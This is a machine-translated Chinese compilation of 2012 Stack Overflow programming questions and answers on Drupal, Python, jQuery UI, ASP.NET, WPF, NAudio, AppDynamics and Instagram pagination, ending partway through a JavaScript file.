我正在开发一个将 Drupal 连接到外部 Web 服务的模块。当用户注册时，我希望他在 Web 服务中注册，而不是在 Drupal 中。我想覆盖提交 user_register 表单时调用的提交函数。

我已经使用 $form['#submit']，但它不起作用。

还有其他解决方案吗？我正在使用drupal7。

我是这样用的

```
function mymodule_form_user_register_form_alter(&$form, &$form_state, $form_id) { 
$form['account']['name']['#title'] = t('Full name'); // perform other changes here 
$form['#submit'][] = 'mymodule_user_register_form_submit' 
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T20:08:48.243

当你使用

```
$form['#submit'][] = 'mymodule_user_register_form_submit' 
```

您实际上并没有覆盖提交模块。您是说在执行所有其他模块（在我之前运行的）创建的提交函数之后，还要执行我的函数`mymodule_user_register_form_submit`

如果您想覆盖提交功能，请使用类似的东西`$form['#submit'] = 'mymodule_user_register_form_submit'`来确保您的功能是唯一将被执行的功能。

# python - 编写通用脚本将数据从文件上传到数据库表

> ID：13524548
> 
> 赞同：0
> 
> 时间：2012-11-23T07:11:36.070
> 
> 标签：python, c, database, shell

请考虑这种情况：

我在数据库中有不同的表说 table1,table2,table3 .....

现在，对于这些表中的每一个，我都有数据进入平面文件，这些文件将插入相应的表中。

我想编写一个通用脚本，它将读取平面文件的第一行，并通过将平面文件中的数据类型与存在的表的模式相匹配来确定应该插入哪个表。

假设：考虑的所有表都将具有不同的模式。

请建议这是否可行，如果是，请指导如何实现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T08:02:20.090

你可以试试这个通用代码：

```
import os
import glob
import MySQLdb

path = '/path/to/directory/containing/flatfiles'
conn_mysql = MySQLdb.connect(host = "localhost",user = "root",passwd="root",db="dbname")
cursor_mysql = conn_mysql.cursor()
table_to_use = ""
for filename in glob.glob( os.path.join(path, '*.txt') ):
    print "Reading file: " + filename
    currentfile = open(filename, 'r')
    numcols = currentfile[0].split()
    if numcols is 10:
        table_to_use = "tbl1"
    elif numcols is 7:
        table_to_use = "tbl2"
    # So on and so forth
    for line in currentfile[1:]:
        insert_data_to_database(line, table_to_use)
        #use the above function to insert data based on the table_to_use 
```

# jquery-ui-datepicker - 日期选择器不显示

> ID：13524551
> 
> 赞同：0
> 
> 时间：2012-11-23T07:11:51.333
> 
> 标签：jquery-ui-datepicker

我的日期选择器有问题。当我聚焦文本字段时，它会正确显示，但是当我单击屏幕中的其他任何位置（使其消失）时，如果我再次聚焦文本字段而没有事先选择另一个元素，则日期选择器不会显示。

这是代码：

```
$(function () {
        $('.date-picker').datepicker({
            changeMonth: true,
            changeYear: true,
            changeDay: true,
            showButtonPanel: true,
            dateFormat: 'dd MM yy',
            onClose: function (dateText, inst) {
                var day = $("#datepicker").datepicker('getDate').getDate();
                var month = $("#datepicker").datepicker('getDate').getMonth() + 1;
                var year = $("#datepicker").datepicker('getDate').getFullYear();
                $(this).datepicker('setDate', new Date(year, month, day));
            }
        });
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:32:30.670

问题出在你的`onClose`功能上。当您调用时`$("#datepicker").datepicker('getDate').getdate()`，您可能会调用`getDate()`null。

以下应该可以解决问题，希望它对您有用=）

```
$(function () {
  $('.date-picker').datepicker({
      changeMonth: true,
      changeYear: true,
      changeDay: true,
      showButtonPanel: true,
      dateFormat: 'dd MM yy',
      onClose: function (dateText, inst) {
          var getdate = $('#datepicker').datepicker('getDate');
          if(getdate) {
              var day = getdate.getDate();
              var month = getdate.getMonth() + 1;
              var year = getdate.getFullYear();
              $('#datepicker').datepicker('setDate', new Date(year, month, day));
          }
       }
    });
}); 
```

**编辑：**`jsfiddle`如果你需要一个工作的概念证明：http : [//jsfiddle.net/jcolicchio/fpS2Q/](http://jsfiddle.net/jcolicchio/fpS2Q/)

# macos - 在 iOS 模拟器上与 Mac 应用程序中的 Quartz 绘图获得相同的颜色输出

> ID：13524556
> 
> 赞同：3
> 
> 时间：2012-11-23T07:12:14.393
> 
> 标签：macos, pdf, colors

我有一个似乎附有一些内部颜色配置文件的 PDF。如果我在 iPhone 模拟器中渲染它，颜色会在 Photoshop 中显示出来，这显然可以解析这个颜色配置文件。如果我在 Mac 上渲染相同的 PDF，我会得到与 Preview 和 Pixelmator 中相同的颜色（不那么明亮、浑浊）。

有什么方法可以在 Mac 上实现与在 iPhone 模拟器中获得的相同（正确）渲染结果？

在 iOS 模拟器上，我使用 CGColorSpaceCreateDeviceRGB 和 kCGImageAlphaPremultipliedFirst 位图上下文。我还设置了渲染意图 kCGRenderingIntentPerceptual，虽然我不知道这是否有什么不同。

在 Mac 上，我尝试了相同的设置，以及所有不同种类的色彩空间，但在模拟器中我永远无法获得相同的结果。

我还尝试了这里提到的两种基于 ICC 的方法：http: [//developer.apple.com/library/mac/#qa/qa1396/_index.html](http://developer.apple.com/library/mac/#qa/qa1396/_index.html)

我越来越绝望了。获得正确颜色的iOS模拟器和Mac有什么不同？我以为 iOS 不做色彩校正，但 Mac 做？现在我正在用 PDFKit 绘制各个页面。Mac 上的 PDFKit 与 iOS 上的颜色校正是否存在差异，使其在 iOS 模拟器上正常工作，但在 Mac 上失败？

我还在 iOS Simulator 中从这个 PDF 中提取了一个 JPG，将其放入 Preview 中的新 PDF 中，并且我的 Mac 渲染产生了与输入完全相同的颜色。

在我看来，iOS 模拟器有一种神奇的能力，可以使用嵌入在这个 PDF 中的颜色配置文件，而 Mac 上的 Preview 或 Quartz 则没有。

请帮忙！

亲切的问候奥利弗·德罗布尼克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T22:39:54.380

我不确切知道模拟器是如何工作的，但我可以向您保证，预览版和 iOS 对 PDF 文件的某些功能的处理非常不正确；尤其是在色彩管理、透明度、叠印、图像的高级压缩等方面......

两个提示：

在 Mac 上，在 Adob​​e Reader 中打开 PDF 文件（从 Adob​​e.com 免费下载）。您在 Reader 中看到的颜色应该非常接近实际情况。如果您的 PDF 文件包含 ICC 配置文件（对于文件中的对象或输出意图中的对象，意味着整个文件），它将被正确使用。在 iOS 上，还可以查看 Adob​​e Reader——它是目前该平台上最好（最高质量）的显示工具。

其次，如果您想知道模拟器或其他工具能做什么或不能做什么，请查看来自 GWG (http://gwg.org/ghentoutputsuite.phtml) 的测试补丁。这些补丁旨在提供非常容易解释某些工具或打印机是否可以处理特定 PDF 功能的结果。

这两个步骤至少应该告诉你什么是有效的以及它在哪里有效。这应该更容易弄清楚你需要纠正什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T09:44:29.373

不幸的是，这是 Mac 上 CGPDF 中已确认的错误。如果您将 CMYK 作为透明色彩空间，它就会显现出来。iOS 正确地忽略了这一点，Mac 弄乱了颜色。

# asp.net - ASP 到 SQL Server 连接基础知识？

> ID：13524558
> 
> 赞同：0
> 
> 时间：2012-11-23T07:12:26.793
> 
> 标签：asp.net, sql-server

如果问题太幼稚，我提前道歉。我是 ASP 和 SQL 服务器世界的新手（到目前为止我一直在使用 PHP 和 MySQL）（我在这里阅读了其他主题，但似乎没有一个能给我明确的答案）

我想将我的 ASP 网站连接到我的 SQL 数据库（目前使用 sql server 2005），我该怎么做？我一直在尝试使用大量的连接字符串，但现在一切都让我感到困惑（种类太多）

另外，建立成功连接后如何执行查询？

我相信这两个的答案会让我开始，我希望我没有要求太多或什么。提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:24:56.507

```
Dim objDbCon
Dim dataCount
Dim sqlQuery

Set objDbCon = Server.CreateObject("ADODB.Connection")

'Change the parameters with your own environment'
objDbCon.ConnectionString = "Provider=SQLOLEDB; Data Source=120.120.120.120; Initial Catalog=Database name; User Id=user1; Password=1234;"

objDbCon.Open

'Put sql script which you want to get result set'
sqlQuery = "SELECT COUNT(*) AS CNT FROM TABLE_NAME"

'This is how you execute sql script and bind the result set to dataset object'
Set Rs = objDbCon.Execute(sqlQuery)

dataCount = Rs("CNT")

Rs.Close 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-06T04:02:44.403

要将 sql 连接添加到 asp.net 网页，首先我们必须获取连接字符串。对于那个打开的服务器资源管理器->数据连接->添加连接。在给定的弹出框中给出服务器名称和数据库名称。添加连接后，进入添加连接的属性窗口，从那里我们将获得连接字符串。之后编写以下代码：

```
 using System.Data;
     using System.Data.SqlClient;

     public void dbconnection
     {
     SqlConnection con;
     con = new SqlConnection("connectionstring");
     con.Open();
     SqlCommand cmd=new SqlCommand("Your sql query",con);
     cmd.ExecuteNonQuery();
     con.close();
     } 
```

对于插入、更新和删除查询，我们使用 ExecuteNonQuery()。对于我们使用的选择查询

```
 SqlDataReader dr = cmd.ExecuteReader(); 
```

# c# - Webgrid MVC4中的多个提交按钮

> ID：13524563
> 
> 赞同：0
> 
> 时间：2012-11-23T07:13:07.913
> 
> 标签：c#, asp.net, asp.net-mvc-3, webgrid

我的索引中有一个 WebGrid，并且有两个提交按钮来执行单独的操作。[来自此代码](http://weblogs.asp.net/imranbaloch/archive/2011/09/13/webgrid-helper-with-check-all-checkboxes.aspx)
的 Webgrid 如何在单击发布按钮时定向到相应的操作。 但是当我提交任何按钮时，只会调用第一个 [HttpPost] 操作。我的代码：

```
@using (Html.BeginForm())
{
    <fieldset>
    <div id="CheckBoxDiv">
        @grid.GetHtmlWithSelectAllCheckBox(
            tableStyle: "grid", 
            checkBoxValue: "ProductID",
            columns: grid.Columns(
                grid.Column(columnName: "ProductName"),
                grid.Column(columnName: "Quantity"),
                grid.Column(" ", " ", format: @<a href="@Url.Action("Index", "Edit", new { UserID = "12345", partnerid = "111" })">Edit</a>),
                grid.Column(columnName: "Rate"),
                grid.Column(columnName: "Price")                  
            )
         ) 
    </div>
    <p>   
         <input type="image" class="btn" name="command" value="Checkout" src="~/Images/Checkout.PNG" style="width: 62px; height: 25px;"  />
         <input type="image" class="btn" name="command" value="Delete" src="~/Images/Remove.png" style="width: 62px; height: 25px;"  />
    </p>
    </fieldset>
} 
```

**控制器代码 **

```
[HttpPost]   
public ActionResult Index(string[] selectedRows)
{
    for (int i = 0; i < selectedRows.Length; i++)
    {
        var objselected = selectedRows.ToList();
        SqlCommand scmd = new SqlCommand("SpCheckDetails", con);
        scmd.CommandType = CommandType.StoredProcedure;
        scmd.Parameters.AddWithValue("@userid", id);
        scmd.Parameters.AddWithValue("@partnerID", partnerid);
        scmd.Parameters.AddWithValue("@productID", objselected);
        scmd.ExecuteNonQuery();
     }
     return RedirectToAction("Index","Checkout");
 }

[HttpPost]       
public ActionResult Delete(string UserID, string partnerid, string productid)
{
     return RedirectToAction("Index", "Cart");
} 
```

我尝试使用此[链接](http://blogs.msdn.com/b/simonince/archive/2011/02/12/detecting-which-button-was-clicked-in-mvc.aspx)来调用这两个操作。但是没有调用命令值。有什么建议么。
**编辑 ：**

```
 public ActionResult Index()
        {
            string id = "12345";
            string partnerid = "xxxxx";
            return View(_service.GetCartDetails(id,partnerid));
        }
    [AcceptVerbs(HttpVerbs.Post)]
    [AcceptParameter(Name = "Checkout")]
    public ActionResult Index(string[] selectedRows, string button)
    {
            return View();
    }
    [AcceptVerbs(HttpVerbs.Post)]
    [AcceptParameter(Name = "Delete")]
    public ActionResult Delete(string[] selectedRows,string UserID, string partnerid, string productid)
    {
            return View();
    } 
```

**查看代码**

```
<input type="image" class="btn" name="Checkout" value="Checkout" src="~/Images/Checkout.PNG"/>
<input type="image" class="btn" name="Delete" value="Delete" src="~/Images/Remove.png" /> 
```

我使用 ActionMethodSelectorAttribute 来获取按钮值。但无论单击哪个按钮，它仍然会转到索引视图。
我的代码中是否有任何错误。?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T07:48:32.890

您应该使用**ActionMethodSelectorAttribute**接口，该接口将识别单击哪个按钮。有关更多信息，请参阅以下链接 [http://weblogs.asp.net/dfindley/archive/2009/05/31/asp-net-mvc-multiple-buttons-in-the-same-form.aspx](http://weblogs.asp.net/dfindley/archive/2009/05/31/asp-net-mvc-multiple-buttons-in-the-same-form.aspx)

# javascript - 在我网站的另一个网页上显示 div 的内容

> ID：13524568
> 
> 赞同：0
> 
> 时间：2012-11-23T07:13:40.400
> 
> 标签：javascript

我想使用 JavaScript 在我的网站上的第 3 方网站上显示特定 div 元素的内容。我知道要显示的 div 元素的 id。这可以做到吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T07:18:42.940

你不能用 Javascript 做到这一点。

您必须使用服务器上的脚本（使用 PHP 之类的东西）下载页面，然后使用下载的数据查看其 DOM，然后选择所需的元素。

Javascript 仅适用于浏览器中显示的当前页面，它不能（不应该）与其他网站对话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T07:28:54.980

尽管没有推荐，但这是可能的：

您可以将外部站点加载到 iframe 中，然后访问加载的框架特定元素以获取所需 div 的值，然后将其放入您自己的 div

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T07:26:17.647

如果您想在自己的网站中显示网站，则可以使用 iframe。

```
<div id="help"><iframe src="http://www.codeforbrowser.com" height="500px;width="600px;"></iframe></div> 
```

# c# - 如何在 Windows 8 Metro App 中使用 StreamSocketListener 和 StreamSocket 而不是 System.Net.Sockets？

> ID：13524569
> 
> 赞同：3
> 
> 时间：2012-11-23T07:13:44.110
> 
> 标签：c#, windows-8, microsoft-metro

我正在尝试将现有的 GChat 应用程序（一个 Windows 窗体应用程序）迁移到 Windows 8 Metro 应用程序。

在我使用的 Windows 窗体应用程序中，

```
 System.Net.Sockets.Socket _socket = new new System.Net.Sockets.Socket(); 
```

启用与“talk.google.com”的连接。

在 MetroApp 中，只有 StreamSocket 和 DatagramSockets 可用我替换了代码中的[建议](https://stackoverflow.com/questions/13489832/how-to-get-the-ipaddress-from-hostname-in-c-sharp-windows-8-metro-app)。

现在我不知道连接是否启用。. .

当它进入代码时

```
 Windows.Networking.Sockets.StreamSocket sSocket = new Windows.Networking.Sockets.StreamSocket();

    sSocket.Controls.KeepAlive = true;

    await sSocket.ConnectAsync(hostName,"https"); 
```

我得到了 IP 地址的详细信息，但是当它通过代码时连接不存在，它退出了。

如果有人知道如何在 Metro App 中处理套接字连接并在后台启用永久连接，请告诉我！

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T09:32:08.080

[从StreamSocket 示例](http://code.msdn.microsoft.com/windowsapps/StreamSocket-Sample-8c573931)开始。这可能会有所帮助。

# javascript - 捕获模态对话框的焦点

> ID：13524578
> 
> 赞同：0
> 
> 时间：2012-11-23T07:15:09.317
> 
> 标签：javascript, modal-dialog, accessibility

我想让模态对话框可访问。我添加了两个隐藏的可聚焦元素

```
<a href="javascript:void(0)" id="dialog-start">Dialog Start </a>
  Some focussable Dialog Elements  
<a href="javascript:void(0)" id="dialog-end" onblur="onblurevent()">Dialog end</a>

function onblurevent(){
   document.getElementById("dialog-start").focus(); 
} 
```

当对话框结束元素模糊事件发生时，我尝试将焦点移动到对话框开始元素调用 focus() 方法，但焦点移动到地址栏。使用以下样式隐藏对话框开始和结束锚标记

```
#dialog-start{
  height:1px;
  left:-9999px; 
  overflow:hidden;
  position:absolute;
  top:0;
  width:1px;
} 
```

我不确定锚样式是否是原因或确保焦点位于对话框内的唯一方法是获取可聚焦元素列表并在容器上的 keydown 事件处理程序中调用 focus() 方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T10:22:05.833

出现问题是因为您没有处理 keydown 事件。当您按下`Tab`最后一个链接时，浏览器会自动将焦点切换到地址栏。因此，如果按下，您只需要`preventDefault()`默认浏览器行为。`Tab`

以下代码将起作用：

```
window.onload = function() {
    var firstAnchor = document.getElementById("dialog-start"),
        lastAnchor = document.getElementById("dialog-end");

    function keydownHandler(e) {
        var evt = e || window.event;
        var keyCode = evt.which || evt.keyCode;
        if(keyCode === 9) { // TAB pressed
            if(evt.preventDefault) evt.preventDefault();
            else evt.returnValue = false;
            firstAnchor.focus();
        }
    }

    if(lastAnchor.addEventListener) lastAnchor.addEventListener('keydown', keydownHandler, false);
    else if(lastAnchor.attachEvent) lastAnchor.attachEvent('onkeydown', keydownHandler);
} 
```

（请注意，您`onblurevent`不再需要功能）

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-01-26T16:58:31.360

```
$(document).ready(function () {
    //set focus on first field in Bootstrap modal when loaded
    $("#yourModal").on('shown.bs.modal', function () {
    $(this).find('#yourField').focus();
    });
}); 
```

# .net - .NET 4 C++ NAudio 吃内存

> ID：13524579
> 
> 赞同：0
> 
> 时间：2012-11-23T07:15:13.673
> 
> 标签：.net, naudio

我正在使用 NAudio 在我的 .NET 4 应用程序中播放 Mp3 文件。首先我初始化 WaveOut：

```
IWavePlayer^ waveOutDevice = gcnew WaveOut(); 
```

然后我有2个按钮。播放按钮：（代码）

```
volumeStream = gcnew WaveChannel32(gcnew Mp3FileReader(gcnew IO::FileStream(path, IO::FileMode::Open, IO::FileAccess::Read, IO::FileShare::ReadWrite)));
mainOutputStream = volumeStream;
waveOutDevice->Init(mainOutputStream);
waveOutDevice->Play(); 
```

它从 FileStream 加载 MP3 并播放它。第二个按钮是停止：（代码）

```
waveOutDevice->Stop(); 
```

它只是停止播放。

当我启动我的应用程序时，它会占用 5.344 KB。

![s1](../Images/b8863e204b576cbec5abd0e109a0a963.png)

但是当我点击 2 个按钮（播放然后停止）（想象我正在播放不同的 MP3）时，大约 10 次应用程序占用了 14.912 KB！

![s2](../Images/7fabdf252b15009fc0cb0592cdcfa55c.png)

而且我不知道如何释放这段记忆。要播放 MP3，我使用这些 NAudio 对象：

```
IWavePlayer^ waveOutDevice;
WaveStream^ mainOutputStream;
WaveChannel32^ volumeStream; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T07:31:15.110

通常，您应该确保您`Dispose`有任何实现 IDisposable 的 .NET 对象。特别是，您没有调用`Dispose`您的`Mp3FileReader`，这不仅会使文件保持打开状态，而且不会清理它打开的 ACM 句柄。

作为使用 .NET 对象的 C++ 程序员，您需要注意的另一件事是 .NET 使用垃圾收集，因此在您使用完某些东西后，内存使用量不会总是立即下降。相反，托管对象可用于垃圾收集，并且只有在垃圾收集器运行后才会释放它们的内存。

# java - AppDynamics（性能监控工具）会减慢我的生产应用程序吗？

> ID：13524580
> 
> 赞同：6
> 
> 时间：2012-11-23T07:15:18.880
> 
> 标签：java, performance, jakarta-ee, monitoring, appdynamics

是否可以在生产中部署性能监控工具 - AppDynamics？要监控的应用程序是标准的 Java/J2EE Web 应用程序。

我从未使用过 AppDynamics，我担心它实际上可能会减慢我的应用程序。

有人在生产中使用过 AppDynamics 吗？或者它应该只用于测试类型的环境。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T17:52:11.290

完全披露：我目前为 AppDynamics 工作。

AppDynamics 专为大批量生产环境而设计，但在生产和非生产环境中同样适用。它目前在 Netflix、Exact Target、Edmunds 和许多其他公司的一些世界上最大的关键任务应用程序环境中运行。以下是现有客户的一些报价……</p>

“它就像一个可以在生产环境中运行的分析器”——Leonid Igolnik，Taleo

“我们发现开销可以忽略不计”——Care.com 的 Jacob Marcus

“我们想要一个不会影响我们的生产跑道的监控解决方案”——John Martin，Edmunds

AppDynamics 开销极低，但我建议您对其进行测试并亲自查看。您可以从 AppDynamics 网站免费下载和使用它。祝您在寻找合适的 APM 工具时好运。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-11T12:32:58.967

供应商做出了许多假设，但以下是最常见的：

1.  我们假设您的应用程序请求处理时间足够长，足以使我们的大量开销相形见绌。

翻译：我们假设您有一个执行缓慢的数据库后端。

1.  我们假设检测应用于代码源的非常有限的部分，以减少我们大量开销的影响。

翻译：我们假设您已经知道自己的性能热点。

1.  我们假设有大量未充分利用的处理能力来减轻我们的大量开销。

翻译：我们假设您不会注意到用来隐藏我们开销的技巧。

1.  我们假设不可能真实可靠地衡量我们的重大开销。

翻译：我们假设您对性能工程知之甚少。

我最喜欢的 (5) 是供应商软件许可中对发布基准测试结果的限制。

翻译：我们假设您毫无疑问地盲目接受我们的主张。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:18:05.197

是的，如果应用程序对调用堆栈采样引起的额外 GC 周期很敏感，它会。影响将取决于线程数和典型调用堆栈深度。这并不特定于 AppDynamics，其他调用堆栈采样解决方案，如 NewRelic 和 VisualVM Sampler 也会产生类似的影响。

[http://www.jinspired.com/wp-content/uploads/2011/11/JXInsightOpenCore_Good_APM_vs_AppDynamics_Bad_APM.pdf](http://www.jinspired.com/wp-content/uploads/2011/11/JXInsightOpenCore_Good_APM_vs_AppDynamics_Bad_APM.pdf)

[http://www.jinspired.com/wp-content/uploads/2011/11/JXInsightOpenCore_vs_AppDynamics.pdf](http://www.jinspired.com/wp-content/uploads/2011/11/JXInsightOpenCore_vs_AppDynamics.pdf)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-10-22T13:10:28.020

Appdynamics 不会显着降低您的系统速度，我参加了一次用户会议，他们说他们总是试图将 cpu 使用率控制在 2% 以下，与您从他们那里得到的相比，这算不了什么。他们每次都在处理样本，所以如果你每秒有 10 个请求或 100 个请求，它们仍然会占用你的 cpu / 带宽 / 任何东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T15:48:01.400

我建议查看 Gartner 的魔力象限并获得 dynaTrace，因为它的开销可以忽略不计，在负载下的生产中不到 1%。

# jquery-ui - jQueryUI - 当同一部分连续打开两次时，手风琴滚动到标题冻结

> ID：13524586
> 
> 赞同：1
> 
> 时间：2012-11-23T07:15:38.723
> 
> 标签：jquery-ui, jquery-ui-accordion

我正在使用以下内容来控制我的手风琴：

```
$(function() {
  $( "#accordion" ).accordion({
    autoHeight: false, collapsible: true, active: false
  });

  $('#accordion').bind('accordionchange', function (event, ui) {
    $(window).scrollTop(ui.newHeader.offset().top);
  });
}); 
```

除非我打开同一个部分两次，否则效果很好。然后，手风琴冻结，我收到以下错误：

ui.newHeader.offset() 未定义

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T07:51:16.550

该`accordionchange`事件似乎是对应于手风琴事件的 jQuery`activate`事件；是的，这有点令人困惑，但这就是[消息来源告诉我](https://github.com/jquery/jquery-ui/blob/1-9-stable/ui/jquery.ui.accordion.js#L663)的：

```
// change events
(function( $, prototype ) {
    //...
        } else if ( type === "activate" ) {
            ret = _trigger.call( this, "change", event, { 
```

[`activate`文档](http://api.jqueryui.com/accordion/#event-activate)有这样的说法：

> **激活（事件，用户界面）**
> 
> 在面板被激活后触发（动画完成后）。[...] 如果手风琴正在折叠，`ui.newHeader`并且`ui.newPanel`将是空的 jQuery 对象。

所以你`ui.newHeader`是一个空的 jQuery 对象，而空的 jQuery 对象没有`offset()`s. 一个快速的长度检查`ui.newHeader`可能会让你明白：

```
$('#accordion').bind('accordionchange', function(event, ui) {
    if(ui.newHeader.length)
        $(window).scrollTop(ui.newHeader.offset().top);
});​ 
```

演示：http: [//jsfiddle.net/ambiguous/e3gUW/](http://jsfiddle.net/ambiguous/e3gUW/)

# wpf - 绑定一个绑定的路径属性

> ID：13524588
> 
> 赞同：4
> 
> 时间：2012-11-23T07:15:49.633
> 
> 标签：wpf, silverlight, data-binding, binding, path

是否可以将绑定的 Path 属性绑定到另一个属性？

我想实现这段代码：

```
Text="{Binding Path={Binding Path=CurrentPath}}" 
```

所以我可以动态调整我的实际绑定所引用的属性。

感谢您的帮助强尼

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T11:25:16.677

I worked it out on myself.

Heres the solution, I hope it might help anyone got the same problem like me.

```
public class CustomBindingBehavior : Behavior<FrameworkElement>
{
    public bool IsBinding
    {
        get
        {
            return (bool)GetValue(IsBindingProperty);

        }
        set
        {
            SetValue(IsBindingProperty, value);
        }
    }

    public string PropertyPath
    {
        get
        {
            return (string)GetValue(PropertyPathProperty);

        }
        set
        {
            SetValue(PropertyPathProperty, value);
        }
    }

    public static DependencyProperty
        PropertyPathProperty = DependencyProperty.Register("PropertyPath", typeof(string),
                        typeof(CustomBindingBehavior), null);

    public static DependencyProperty
        IsBindingProperty = DependencyProperty.Register("IsBinding", typeof(bool),
                        typeof(CustomBindingBehavior), null);

    protected override void OnAttached()
    {
        if (AssociatedObject is TextBlock)
        {
            var tb = AssociatedObject as TextBlock;
            tb.Loaded += new RoutedEventHandler(tb_Loaded);
        }
    }

    private void tb_Loaded(object sender, RoutedEventArgs e)
    {
        AddBinding(sender as TextBlock, TextBlock.TextProperty);
    }

    private void AddBinding(DependencyObject targetObj, DependencyProperty targetProp)
    {
        if (IsBinding)
        {
            Binding binding = new Binding();
            binding.Path = new PropertyPath(this.PropertyPath, null);

            BindingOperations.SetBinding(targetObj, targetProp, binding);
        }
        else
        {
            targetObj.SetValue(targetProp, this.PropertyPath);
        }
    }
} 
```

And heres the implementation in XAML:

```
<TextBlock >
                <i:Interaction.Behaviors>
                    <behaviors:CustomBindingBehavior PropertyPath="{Binding Path=HeaderPropertyBinding}" IsBinding="{Binding Path=HeaderIsBinding}" />
                </i:Interaction.Behaviors>
            </TextBlock> 
```

Greetings Jonny

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T08:27:16.387

As other posters have mentioned, you can only set a binding on a dependency property - which path is not. The underlying reason is that xaml is source code that gets compiled. At compile time the compiler has no idea what the value of 'CurrentPath' is, and would not be able to compile. Essentially what you are looking to do is runtime reflection of a property value - which could be done using another property in the ViewModel you are binding to, or using a converter.

ViewModel:

```
public string CurrentValue
{
    get
    {
         var property = this.GetType().GetProperty(CurrentPath);
         return property.GetValue(this, null);
    }
} 
```

Using a converter:

```
public class CurrentPathToValueConverter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        var viewModel = (ViewModel)value;
        var property = viewModel.GetType().GetProperty(viewModel.CurrentPath);
        var currentValue = property.GetValue(viewModel, null);
        return currentValue;
    }
    public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
    {
        throw new NotImplementedException();
    }
} 
```

Of couse these only work if you want to get a simple property of the object - if you want to get something more complex your reflection code is going to get a lot more complex.

Unless you are building something like a property grid, or for some other reason you actually want to introspect the objects running in your application, I would suggest you revisit your design, as reflection is really only suited to a few situations.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-23T07:22:56.123

Path 不是依赖属性，因此绑定将不起作用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-23T08:26:24.263

也许您可以绑定到基于 switch 语句返回另一个属性的属性并绑定到该属性。更改“开关”属性并更改另一个属性的输出。只是不要忘记在绑定属性的 switch 属性中包含您的 NotifyPropertyChanged 内容，否则您的视图将不会更新。例如

```
private int _mySwitch;

//Set this to determine what the other property will return.
public int SwitchProperty
{
    get { return _mySwitch; }
    set
    {
        _mySwitch = value;
        NotifyPropertyChanged("MySwitchableProperty");
    }
}
public String PropertyA { get; set; }
public String PropertyB { get; set; }

//Bind to this property
public String MySwitchableProperty
{
    get
    {
        switch (SwitchProperty)
        {
            case 1:
                return PropertyA;
                break;
            case 2:
                return PropertyB;
                break;
            default :
                return String.Empty;
                break;
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T08:39:40.283

I think converter can helps your. Expample

First control

```
Text="{Binding Path=CurrentPath}" 
```

Second control

```
Text="{Binding Path=CurrentPath, Convertor={converters:MyConvertor}}" 
```

Base converter

```
public abstract class ConvertorBase<T> : MarkupExtension, IValueConverter
    where T : class, new()
    {
            public abstract object Convert(object value, Type targetType, object parameter,
            CultureInfo culture);

            public virtual object ConvertBack(object value, Type targetType, object parameter,
            CultureInfo culture)
        {
            throw new NotImplementedException();
        }

        #region MarkupExtension members

        public override object ProvideValue(IServiceProvider serviceProvider)
        {
            if (_converter == null)
                _converter = new T();
            return _converter;
        }

        private static T _converter = null;

        #endregion
    } 
```

MyConverter

```
 public class MyConverter: ConvertorBase<MyConverter>
    {
        public override object Convert(object value, Type targetType, object parameter, CultureInfo culture)
        {
            return (string)value.Equals("blabla") ? "Yes" : "No"; // here return necessary parametr
        }

        public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
        {
            return null;
        }
    } 
```

# php - Instagram分页中的重复照片

> ID：13524592
> 
> 赞同：0
> 
> 时间：2012-11-23T07:16:18.150
> 
> 标签：php, json, instagram

我正在尝试从特定标签中提取照片。找到了一个很棒的教程，我已经设法从 Instagram 中提取带有分页的照片。

我现在面临的问题是如果到达照片的末尾会显示重复的照片。

**HTML 源代码**

```
<!DOCTYPE html>
<html>
<head>
  <script src='http://code.jquery.com/jquery-1.7.2.min.js' type='text/javascript' charset='utf-8'></script>
  <script src='javascripts/application.js' type='text/javascript' charset='utf-8'></script>

  <link rel='stylesheet' href='stylesheets/application.css' type='text/css' media='screen'>
  <title>Photo Stream </title>

  <meta name="description" content="Search for instagram images online.">
    <meta name="author" content="Omar Sahyoun">
</head>
<body>
  <!--<form id='search'>
    <button class="button" type="submit" id="search-button" dir="ltr" tabindex="2">
      <span class="button-content">Search</span>
    </button>
    <div class='search-wrap'>
      <input class='search-tag' type='text' tabindex='1' value='cats' />
    </div>
  </form>-->
<h2 id="search">Photo Stream </h2>
  <div id='photos-wrap'>
  </div>

  <div class='paginate'>
    <a class='button'  style='display:none;' data-max-tag-id='' href='#'>View More...</a>
  </div>
</body>
</html> 
```

**Javascript 文件**

```
// Add trim function support for IE7/IE8
if(typeof String.prototype.trim !== 'function') {
    String.prototype.trim = function() {
        return this.replace(/^\s+|\s+$/g, '');
    }
}

// Instantiate an empty object.
var Instagram = {};

// Small object for holding important configuration data.
Instagram.Config = {
  clientID: 'xxxx',
  apiHost: 'https://api.instagram.com'
};

// Quick and dirty templating solution.
